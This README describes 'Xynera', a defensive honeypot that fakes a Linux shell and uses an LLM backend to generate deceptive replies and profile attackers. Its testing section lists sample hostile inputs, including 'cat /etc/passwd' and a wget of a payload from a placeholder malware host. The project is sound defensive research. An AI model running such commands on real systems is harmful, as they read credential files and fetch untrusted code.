# 🐝 Xynera – Honey for Hackers

Xynera is an intelligent, high-fidelity honeypot system designed to deceive attackers by simulating realistic operating environments and dynamic network responses. It consists of two primary components:
1. **Xynera Honeypot (`xynera_honey`)**: The interactive deception layer that attackers connect to, simulating Linux systems, filesystem actions, process logs, and network services.
2. **Xynera AI Backend (`xynera_ai`)**: The intelligence layer powered by LLMs (Retrieval-Augmented Generation / RAG) and threat analyzers, generating realistic responses for complex commands and profiling attacker activity.

---

## 📐 System Architecture & Data Flow

```
Attacker (e.g., Kali Linux)
        │ (TCP port 2222)
        ▼
Xynera Honeypot (Deception Layer) ◄───► Local Simulation (whoami, pwd, ls, ps, ss, etc.)
        │
        ▼ (HTTP POST /process)
Xynera AI Backend (Intelligence Layer) ───► RAG Engine & LLM Deception
```

### Data Flow
1. Attacker connects via TCP and enters a command.
2. `server.py` captures the command and forwards it to `command_router.py`.
3. If it is a basic command (e.g. `ls`, `ps`, `netstat`), it is handled by the **Local Simulation Layer** using fake module components.
4. If it is a complex or unknown discovery command (e.g., `nmap`), it is routed via `ai_client.py` to the **AI Backend** (`api_server.py`).
5. The AI Backend classifies the command, updates the attacker's threat profile (IP-based scoring), retrieves context from the vector store / knowledge base, and queries the LLM for a high-fidelity deception response.
6. The simulated response is returned to the honeypot server and displayed to the attacker.

---

## ⚙️ Project Structure

```text
honey-main
├── xynera_honey/              # Deception Layer (Honeypot Server)
│   ├── server.py              # Main TCP socket handler and connection loop
│   ├── session_manager.py     # Tracks attacker sessions (IP, CWD, history)
│   ├── command_router.py      # Routes attacker inputs to local or AI simulation
│   ├── fake_filesystem.py     # High-fidelity Linux filesystem simulation
│   ├── fake_process.py        # Simulates active process listings (ps, top)
│   ├── fake_network.py        # Simulates active socket connections (netstat, ss)
│   ├── ai_client.py           # Relays complex commands to the AI Backend API
│   ├── malware_detector.py    # Detects and alerts on payload downloads (wget, curl)
│   └── logger.py              # Rotating logs for forensic & monitoring analysis
│
├── xynera_ai/                 # Intelligence Layer (AI Backend)
│   ├── api_server.py          # FastAPI server handling /process requests
│   ├── classifier.py          # Classifies attacker commands into MITRE categories
│   ├── attacker_profile.py    # Scores and updates risk level for attacker IPs
│   ├── threat_engine.py       # Determines final threat levels based on scores
│   ├── rag_engine.py          # Vector retrieval and Groq API orchestration
│   ├── vector_store.py        # FAISS search engine for command knowledge
│   ├── knowledge_base.py      # Curated documentation and system details
│   ├── config.py              # Configuration manager (.env loader)
│   └── logger.py              # Event logging for backend processes
│
└── scratch/                   # Test & Verification scripts
    ├── run_attacker_profile.py# CLI demo for profiling logic
    └── verify_filesystem.py   # Test suite for simulated paths, cd, and cat
```

---

## 🚀 Setup & Execution

### Prerequisites
* Python 3.10+
* Virtual Environment tools (`venv`)

### Step 1: Run the AI Backend (Intelligence Layer)
1. Navigate to the AI folder:
   ```bash
   cd honey-main/xynera_ai
   ```
2. Set up the virtual environment:
   ```bash
   python3 -m venv venv
   source venv/bin/activate  # On Windows: .\venv\Scripts\activate
   ```
3. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
4. Configure environment variables inside `.env`:
   ```env
   GROQ_API_KEY=your_api_key_here
   ```
5. Run the API Server:
   ```bash
   python api_server.py
   ```

### Step 2: Run the Honeypot Server (Deception Layer)
1. Open a new terminal and navigate to the Honey folder:
   ```bash
   cd honey-main/xynera_honey
   ```
2. Set up the virtual environment:
   ```bash
   python3 -m venv venv
   source venv/bin/activate  # On Windows: .\venv\Scripts\activate
   ```
3. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
4. Run the Honeypot Server:
   ```bash
   python server.py
   ```

---

## 🧪 Testing the Simulation

### Option 1: Direct Attacker Connection (Netcat)
In your attacker terminal, connect to the Honeypot server (running on port `2222`):
```bash
nc 127.0.0.1 2222
```
Try executing commands like:
* `whoami`, `pwd`, `ls -la`, `ps aux` (Local high-fidelity simulation)
* `cat /etc/passwd` or `cat /var/log/syslog`
* `nmap 192.168.1.1` (Routed to AI Backend)
* `wget http://malware-site.com/payload.sh` (Triggering malware alerts)

### Option 2: Direct API Query (Curl)
```bash
curl -X POST http://127.0.0.1:5000/process \
-H "Content-Type: application/json" \
-d '{"ip":"192.168.1.99","command":"nmap -sV target"}'
```

---

## 🛡️ Core Deception Rules
For maximum realism, the honeypot operates under these constraints:
1. **Never Execute Real Commands**: No `os.system()` or `subprocess` commands run on the host. Everything is mock-simulated.
2. **Fallback Safely**: Unrecognized commands always return standard shell errors (e.g. `command not found`) rather than empty results.
3. **No Visible System Crashes**: Real tracebacks or exceptions are caught silently and formatted to keep the attacker inside the simulation.
4. **Consistency**: Changes in directory (`cd`) and files read (`cat`) persist realistically throughout the terminal session.

---

## 📊 System Screenshots & Monitoring

<img width="1262" height="941" alt="AI Threat Detection Interface" src="https://github.com/user-attachments/assets/84650c4f-0b1d-4346-9029-c1c3fedaf02b" />
<img width="1267" height="906" alt="Attacker Profiling Logs" src="https://github.com/user-attachments/assets/e249d548-84f9-4920-a94b-9e9da52a9093" />
<img width="1261" height="940" alt="Active Session Logs" src="https://github.com/user-attachments/assets/3c3128af-a32a-4b53-8287-a1b2c1a877a6" />
